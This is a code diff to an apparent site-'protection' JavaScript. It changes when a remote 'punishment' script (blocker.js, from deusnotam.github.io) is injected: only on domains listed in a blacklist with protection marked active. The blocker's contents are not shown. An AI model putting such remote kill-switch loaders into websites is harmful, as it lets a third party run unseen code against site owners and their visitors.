@@ -18,12 +18,30 @@ if (!window.D3usN0tamProtect) {
   var activatorScript = document.createElement('script');
   activatorScript.src = 'https://deusnotam.github.io/activator.js';
   document.head.appendChild(activatorScript);
-  
-  // Подключение blocker.js - скрипт наказаний
-  var blockerScript = document.createElement('script');
-  blockerScript.src = 'https://deusnotam.github.io/protect/blocker.js';
-  document.head.appendChild(blockerScript);
 
+  function checkDomain() {
+    const currentDomain = window.location.hostname;
+
+    // Проверка, есть ли текущий домен в списке
+    const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
+
+    if (!siteInfo) {
+        // Обработка случая, когда домен не найден в списке
+        console.log("Сайт не найден в черном списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system blacklist.");
+    } else {
+        // Проверка, если protect у домена равен "active"
+        if (siteInfo.protect === "active") {
+            // Подключение blocker.js - скрипт наказаний, если домен найден в списке и protect равен "active"
+          var blockerScript = document.createElement('script');
+          blockerScript.src = 'https://deusnotam.github.io/protect/blocker.js';
+          document.head.appendChild(blockerScript);
+        }
+    }
+}
+
+// Вызов функции для проверки домена
+checkDomain();
+  
   // Устанавливаем флаг, что файл подключен
   window.D3usN0tamProtect = true;
 }
